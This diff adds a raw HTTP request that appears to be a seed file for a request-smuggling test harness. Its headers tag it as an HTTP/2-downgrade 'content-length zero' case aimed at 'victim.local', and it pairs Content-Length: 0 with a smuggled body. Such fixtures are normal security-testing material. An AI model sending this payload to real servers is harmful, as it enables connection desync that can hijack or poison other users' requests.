@@ -1,0 +1,16 @@
+POST /reflect/prefix HTTP/1.1
+Host: victim.local
+X-WF-Request-ID: seedh20zero
+X-WF-Family: h2_0
+X-WF-Tags: H2.0,downgrade,content_length_zero
+X-WF-Transport: h2_raw
+X-WF-Delivery: h2_raw
+X-WF-Probe: none
+X-WF-Pause-MS: 0
+X-WF-Chunk-Shape: none
+X-WF-H2-Mode: zero_length_body
+X-WF-H2-End-Stream: normal
+X-WF-Impact: /reflect/prefix
+Content-Length: 0
+
+prefix=ignored
